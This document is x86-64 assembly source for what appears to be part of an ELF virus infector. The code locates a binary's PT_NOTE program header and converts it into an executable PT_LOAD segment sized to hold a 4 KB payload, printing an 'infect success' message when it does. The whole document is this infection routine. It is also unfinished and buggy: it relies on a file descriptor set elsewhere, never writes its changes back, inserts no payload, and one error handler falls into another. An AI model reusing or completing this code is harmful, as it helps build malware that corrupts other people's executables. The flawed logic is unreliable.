section .bss
    stack_buffer resb 10000          ; Allocate 10,000 bytes for ELF data

section .data
    file_open_error_msg db "Error opening file", 0xA  ; Error message
    file_open_error_len equ $ - file_open_error_msg
    
    infect_success_msg db "PT_NOTE segment successfully modified.", 0xA
    infect_success_len equ $ - infect_success_msg
    
    infect_error_msg db "PT_NOTE segment not found or error modifying.", 0xA
    infect_error_len equ $ - infect_error_msg
    
    read_error_msg db "Error reading ELF file", 0xA
    read_error_len equ $ - read_error_msg
    

section .text
global _start

_start:
    ; Open the ELF file (already done in your program) and save fd in rdi
    ; Read ELF file contents into stack_buffer
    mov rsi, stack_buffer             ; Load address of buffer
    mov rdx, 10000                    ; Maximum bytes to read
    mov rax, 0                        ; Syscall number for read()
    syscall                           ; Perform read()

    test rax, rax                     ; Check if read() failed
    js read_error                     ; Jump if negative

    ; Parse the ELF header
    mov r15, stack_buffer             ; r15 now points to the ELF data in memory

    ; Extract ELF header details
    mov cx, word [r15 + 56]           ; Number of PHT entries (e_phnum)
    mov rbx, [r15 + 32]               ; PHT offset (e_phoff)
    mov dx, word [r15 + 54]           ; PHT entry size (e_phentsize)

parse_phdr:
    xor rcx, rcx                       ; Zero rcx (iterator counter)
    xor rdx, rdx                       ; Zero rdx (entry size)

    ; Load Program Header Table (PHT) details
    mov cx, word [r15 + 56]            ; e_phnum: Number of entries in the PHT
    mov rbx, [r15 + 32]                ; e_phoff: Offset of the PHT in the file
    mov dx, word [r15 + 54]            ; e_phentsize: Size of each PHT entry

    ; Verify the PHT offset is within bounds
    cmp rbx, 10000                     ; Ensure PHT offset is within buffer size
    jae pt_note_not_found

loop_phdr:
    cmp rcx, 0                         ; Check if we've processed all entries
    jz pt_note_not_found               ; Exit if no more entries

    ; Verify that the current PHT entry is within bounds
    cmp rbx, 10000                     ; Ensure current entry is within buffer
    jae pt_note_not_found

    ; Check if the current segment is PT_NOTE
    cmp dword [r15 + rbx], 0x4         ; Compare p_type with PT_NOTE (value 4)
    je pt_note_found                   ; If found, jump to modify it

    ; Move to the next PHT entry
    add rbx, rdx                       ; Increment offset by size of a PHT entry
    dec rcx                            ; Decrement remaining entries
    jmp loop_phdr                      ; Repeat loop

pt_note_found:
    ; Ensure rax is the base of the ELF file
    mov rax, stack_buffer

    ; Revalidate computed address
    lea rdi, [rax + rbx]             ; Compute address of p_type field
    cmp rdi, stack_buffer + 10000    ; Ensure address is within bounds
    jae pt_note_not_found            ; Handle out-of-bounds access

    ; Modify PT_NOTE -> PT_LOAD
    mov dword [rdi], 0x1             ; Change p_type to PT_LOAD
    or dword [rdi + 4], 0x5          ; Set p_flags to RX (read and execute)

    ; Set a high memory virtual address for PT_LOAD
    mov rdi, 0x7FFFFFFFF000            ; High memory address for PT_LOAD
    mov [r15 + rbx + 16], rdi          ; p_vaddr
    mov [r15 + rbx + 24], rdi          ; p_paddr

    ; Increase file and memory sizes for PT_LOAD
    mov rdi, 0x1000                    ; 4 KB size for payload
    add qword [r15 + rbx + 32], rdi    ; Increment p_filesz
    add qword [r15 + rbx + 40], rdi    ; Increment p_memsz

    ; Ensure proper alignment
    mov qword [r15 + rbx + 48], 0x1000 ; Set p_align to 4 KB

    ; Print success message
    mov rax, 1                         ; Syscall: write
    mov rdi, 1                         ; File descriptor: stdout
    lea rsi, [infect_success_msg]      ; Message to write
    mov rdx, infect_success_len        ; Message length
    syscall

    ; Exit gracefully
    mov rax, 60                        ; Syscall: exit
    xor rdi, rdi                       ; Exit code: 0
    syscall

pt_note_not_found:
    ; Print error message if PT_NOTE was not found
    mov rax, 1                         ; Syscall: write
    mov rdi, 2                         ; File descriptor: stderr
    lea rsi, [infect_error_msg]        ; Message to write
    mov rdx, infect_error_len          ; Message length
    syscall

    ; Exit with error code
    mov rax, 60                        ; Syscall: exit
    mov rdi, 1                         ; Exit code: 1
    syscall

    ; Exit program
    mov rax, 60                 ; Exit syscall
    xor rdi, rdi                ; Exit code 0
    syscall

file_open_error:
    ; Handle file open error
    mov rax, 1                  ; Syscall number for write()
    mov rdi, 2                  ; File descriptor for stderr
    lea rsi, [file_open_error_msg]
    mov rdx, file_open_error_len
    syscall

    ; Exit program with error code
    mov rax, 60                 ; Exit syscall
    mov rdi, 1                  ; Exit code 1
    syscall
    
read_error:
    ; Handle read error
    mov rax, 1               ; Syscall number for write()
    mov rdi, 2               ; File descriptor for stderr
    lea rsi, [read_error_msg]
    mov rdx, read_error_len
    syscall
    
no_filename_error:
    ; Handle missing filename error
    mov rax, 1                  ; Syscall number for write()
    mov rdi, 2                  ; File descriptor for stderr
    lea rsi, [file_open_error_msg] ; Reuse the same error message
    mov rdx, file_open_error_len
    syscall

    ; Exit program with error code
    mov rax, 60                 ; Exit syscall
    mov rdi, 1                  ; Exit code 1
    syscall

